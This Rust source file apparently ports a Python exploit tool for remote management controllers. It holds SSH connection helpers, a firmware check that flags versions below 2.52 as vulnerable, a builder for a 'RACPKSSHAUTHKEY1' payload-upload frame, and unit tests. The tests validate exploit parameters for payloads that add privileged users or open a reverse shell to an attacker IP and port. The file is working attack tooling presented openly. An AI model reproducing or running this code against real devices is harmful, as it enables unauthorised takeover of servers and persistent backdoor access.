/// The python `except Exception as e: result["error"] = f"SSH error: {e}"`.
fn fail_ssh(mut result: InventoryResult, e: impl std::fmt::Display) -> InventoryResult {
    let msg = format!("SSH error: {e}");
    println!("Error: {msg}");
    result.error = Some(msg);
    println!("SSH connection closed");
    result
}

/// TCP connect with the paramiko `timeout=30` behavior (per-address attempt).
fn tcp_connect(host: &str, port: u16, timeout: Duration) -> Result<TcpStream> {
    let addrs: Vec<_> = (host, port).to_socket_addrs()?.collect();
    let mut last_err = None;
    for addr in addrs {
        match TcpStream::connect_timeout(&addr, timeout) {
            Ok(stream) => return Ok(stream),
            Err(e) => last_err = Some(e),
        }
    }
    Err(last_err
        .unwrap_or_else(|| std::io::Error::other("no addresses resolved"))
        .into())
}

/// TCP connect with a bounded retry loop (python made exactly one attempt).
fn connect_with_retry(
    host: &str,
    port: u16,
    timeout: Duration,
    attempts: u32,
    pause: Duration,
) -> Result<TcpStream> {
    let mut last_err = None;
    for attempt in 1..=attempts.max(1) {
        match tcp_connect(host, port, timeout) {
            Ok(stream) => return Ok(stream),
            Err(e) => {
                last_err = Some(e);
                if attempt < attempts {
                    std::thread::sleep(pause);
                }
            }
        }
    }
    match last_err {
        Some(e) => Err(e),
        None => Err(anyhow::Error::msg("no addresses resolved")),
    }
}

/// Read (and discard) the SSH banner / shell preamble until the stream goes
/// quiet for `quiet`, giving the whole thing at most `max_total`. Replaces
/// the python `sleep(3)` + blind-drain dance: healthy sessions save ~2s,
/// dead-but-connected sessions cost at most 5s instead of 3s+drain.
fn wait_until_quiet(channel: &mut ssh2::Channel, max_total: Duration, quiet: Duration) {
    let started = Instant::now();
    let mut sink = String::new();
    let mut last_data: Option<Instant> = None;
    loop {
        if recv_ready_drain(channel, 4096, &mut sink).is_some() {
            last_data = Some(Instant::now());
        }
        if channel.eof() {
            break;
        }
        let saw_output_and_quiet = last_data.is_some_and(|t| t.elapsed() >= quiet);
        if saw_output_and_quiet || started.elapsed() >= max_total {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
}

/// python `if shell.recv_ready(): output = shell.recv(max)` — one chunk read.
/// Returns the decoded character count (the python prints `len(output)`) or
/// `None` when nothing was available. Data is appended to `sink` lossily
/// decoded, mirroring `output.decode("utf-8", errors='ignore')`.
fn recv_ready_drain(channel: &mut ssh2::Channel, max: usize, sink: &mut String) -> Option<usize> {
    let available = channel.read_window().available;
    if available == 0 {
        return None;
    }
    let mut recv_buf = vec![0u8; available.min(max as u32) as usize];
    match channel.read(&mut recv_buf) {
        Ok(0) => None,
        Ok(n) => {
            let chunk = String::from_utf8_lossy(&recv_buf[..n]).into_owned();
            let chars = chunk.chars().count();
            sink.push_str(&chunk);
            Some(chars)
        }
        Err(_) => None,
    }
}

// ---------------------------------------------------------------------------
// Small parsing helpers
// ---------------------------------------------------------------------------

/// `<prodClassName>...</prodClassName>` extraction with python's try/except
/// swallow: `text.split('<prodClassName>')[1].split('</prodClassName>')[0]`.
fn xml_tag_field(text: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = text.find(&open)? + open.len();
    let rest = &text[start..];
    let end = rest.find(&close)?;
    Some(rest[..end].to_string())
}

/// `data.get('hostname', 'Unknown')` semantics for `aimGetProp` members:
/// * key missing -> "Unknown"
/// * present-but-null or non-string -> None
/// * otherwise the string itself
fn aim_get_default(aim: &Value, key: &str) -> Option<String> {
    match aim.get(key) {
        None => Some("Unknown".to_string()),
        Some(Value::String(s)) => Some(s.clone()),
        Some(_) => None,
    }
}

/// python `json.loads(rSession.text)['aimGetProp'].get('fwVersion', '')`
/// including which malformed inputs raise (→ error result) and which fall
/// through (→ no error, `fwVersion == ""`).
fn extract_fw_version(session_text: &str) -> Result<String> {
    let data = serde_json::from_str::<Value>(session_text)
        .map_err(|e| anyhow!("JSON decode error: {e}"))?;
    let aim = match &data {
        Value::Object(map) => {
            map.get("aimGetProp").ok_or_else(|| anyhow!("KeyError: 'aimGetProp'"))?
        }
        _ => bail!("TypeError: session payload is not an object"),
    };
    let fw = match aim {
        Value::Object(obj) => match obj.get("fwVersion") {
            None => String::new(),
            Some(Value::String(s)) => s.clone(),
            Some(_) => bail!("AttributeError: fwVersion is not a str"),
        },
        _ => bail!("AttributeError: 'aimGetProp' value has no get()"),
    };
    Ok(fw)
}

/// python:
///
/// ```python
/// parts = fwVersion.split('.')
/// if len(parts) >= 2:
///     major = int(parts[0]); minor = int(parts[1])
///     fwVulnerable = (major < 2) or (major == 2 and minor < 52)
/// ```
fn firmware_vulnerable(fw_version: &str) -> Result<bool> {
    let parts: Vec<&str> = fw_version.split('.').collect();
    if parts.len() < 2 {
        return Ok(false);
    }
    let major: i64 = parse_int(parts[0])?;
    let minor: i64 = parse_int(parts[1])?;
    Ok(major < 2 || (major == 2 && minor < 52))
}

/// `int(" 2 ")` accepts surrounding whitespace; negatives allowed.
fn parse_int(s: &str) -> Result<i64> {
    s.trim()
        .parse::<i64>()
        .map_err(|_| anyhow!("ValueError: invalid literal for int() with base 10: '{s}'"))
}

// ---------------------------------------------------------------------------
// Unit tests — helper parity against the Python source
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn firmware_version_matches_python_logic() {
        // vulnerable when major < 2 or (2, x < 52)
        assert!(firmware_vulnerable("1.62.62.62").unwrap());
        assert!(firmware_vulnerable("2.51.51.51").unwrap());
        assert!(!firmware_vulnerable("2.81.81.81").unwrap());
        assert!(!firmware_vulnerable("3.30.30.30").unwrap());
        // "1" / "" → fewer than two parts → silently not vulnerable
        assert!(!firmware_vulnerable("").unwrap());
        assert!(!firmware_vulnerable("2").unwrap());
    }

    #[test]
    fn fw_version_json_semantics_match_python() {
        // json.loads(...)['aimGetProp'].get('fwVersion', '')
        assert_eq!(extract_fw_version(r#"{"aimGetProp":{"fwVersion":"2.61.61.60"}}"#).unwrap(), "2.61.61.60");
        // missing key inside aimGetProp -> ""
        assert_eq!(extract_fw_version(r#"{"aimGetProp":{"hostname":"x"}}"#).unwrap(), "");
        // malformed -> python raises (error result in checkIfVulnerable)
        assert!(extract_fw_version("not json").is_err());
        assert!(extract_fw_version("[]").is_err());
        // .get on null -> AttributeError
        assert!(extract_fw_version(r#"{"aimGetProp":null}"#).is_err());
    }

    #[test]
    fn xml_field_extraction_matches_python_split() {
        let data = "<data><prodClassName>Enterprise Trial</prodClassName></data>";
        assert_eq!(xml_tag_field(data, "prodClassName"), Some("Enterprise Trial".to_string()));
        // missing tag -> python IndexError -> swallowed (None)
        assert_eq!(xml_tag_field(data, "other"), None);
    }

    #[test]
    fn aim_get_default_semantics() {
        let aim = serde_json::json!({"hostname": "host1", "fwVersion": null});
        assert_eq!(aim_get_default(&aim, "hostname"), Some("host1".to_string()));
        // .get('missing', 'Unknown') -> "Unknown"
        assert_eq!(aim_get_default(&aim, "sysDesc"), Some("Unknown".to_string()));
        // present but null -> None
        assert_eq!(aim_get_default(&aim, "fwVersion"), None);
    }

    #[test]
    fn upload_framing_matches_python() {
        // FAlias + (32 - len(FAlias))*b'\0' + <L len + <L flags + payload
        let payload_so = vec![0xAA; 123];
        let upload = build_upload_frame(&payload_so);
        assert_eq!(upload.len(), 32 + 8 + 123);
        assert_eq!(&upload[..16], b"RACPKSSHAUTHKEY1");
        assert!(upload[16..32].iter().all(|b| *b == 0));
        assert_eq!(upload[32..36], 123u32.to_le_bytes());
        assert_eq!(upload[36..40], 1u32.to_le_bytes());
        assert_eq!(&upload[40..], &payload_so[..]);
    }

    #[test]
    fn exploit_params_validation_fail_fast() {
        // valid defaults -> ok
        let params = ExploitParams::default();
        assert!(validate_exploit_params(&params).is_ok());

        // unknown payload -> python-parity message, intact
        let params = ExploitParams { payload_type: "nope", ..ExploitParams::default() };
        let err = validate_exploit_params(&params).unwrap_err();
        assert_eq!(
            err,
            "Invalid payload type. Available types: [adduser, adduser_enterprise, quickpayload, reverseshell]"
        );

        // bad privilege noticed at render time, not gcc time
        let params = ExploitParams { privilege: "not-a-number", ..ExploitParams::default() };
        let err = validate_exploit_params(&params).unwrap_err();
        assert!(err.contains("invalid privilege 'not-a-number'"));

        // quote injection into the C source rejected
        let params = ExploitParams { password: "cal'\"v\"in", ..ExploitParams::default() };
        assert!(validate_exploit_params(&params).is_err());

        // empty values rejected
        let params = ExploitParams { username: "", ..ExploitParams::default() };
        assert_eq!(validate_exploit_params(&params).unwrap_err(), "username must not be empty");
    }

    #[test]
    fn exploit_params_validation_reverseshell_target() {
        let base = ExploitParams::default();
        let missing_ip = ExploitParams {
            payload_type: "reverseshell",
            reverse_ip: None,
            reverse_port: None,
            ..base
        };
        assert_eq!(
            validate_exploit_params(&missing_ip).unwrap_err(),
            "reverseshell payload requires --reverse-ip"
        );

        let missing_port = ExploitParams {
            payload_type: "reverseshell",
            reverse_ip: Some("10.10.10.5"),
            reverse_port: None,
            ..base
        };
        assert_eq!(
            validate_exploit_params(&missing_port).unwrap_err(),
            "reverseshell payload requires --reverse-port"
        );

        let ok = ExploitParams {
            payload_type: "reverseshell",
            reverse_ip: Some("10.10.10.5"),
            reverse_port: Some(4444),
            ..base
        };
        assert!(validate_exploit_params(&ok).is_ok());
    }

    #[test]
    fn privilege_accepts_hex_and_decimal() {
        assert_eq!(validate_privilege("0x000001ff").ok(), Some(0x1ff));
        assert_eq!(validate_privilege("0X01F") .ok(), Some(0x1f));
        assert_eq!(validate_privilege("511").ok(), Some(511));
        assert!(validate_privilege("").is_err());
        assert!(validate_privilege("0xzz").is_err());
        assert!(validate_privilege("-1").is_err());
    }

    #[test]
    fn dangerous_c_literal_chars_rejected() {
        for bad in ["ca\"lvin", "cal\\vin", "cal\nvin", "cal\rvin", "cal\0vin"] {
            let err = check_c_literal(bad, "password").unwrap_err();
            assert!(err.contains("password contains an unallowable character"), "{err}");
        }
        assert!(check_c_literal("calvin", "password").is_ok());
    }

    #[test]
    fn retry_backoff_schedule_is_exponential_and_capped() {
        assert_eq!(retry_backoff_ms(1), 250);
        assert_eq!(retry_backoff_ms(2), 500);
        assert_eq!(retry_backoff_ms(3), 1000);
        assert_eq!(retry_backoff_ms(4), 2000);
        assert_eq!(retry_backoff_ms(5), 2000);
        assert_eq!(retry_backoff_ms(99), 2000);
    }

    #[test]
    fn jittered_backoff_stays_near_schedule() {
        for attempt in 1..=10 {
            let d = retry_backoff(attempt);
            let target = retry_backoff_ms(attempt);
            assert!(d.as_millis() >= (target as u128 * 3) / 4);
            assert!(d.as_millis() <= (target as u128 * 5) / 4);
        }
    }
}
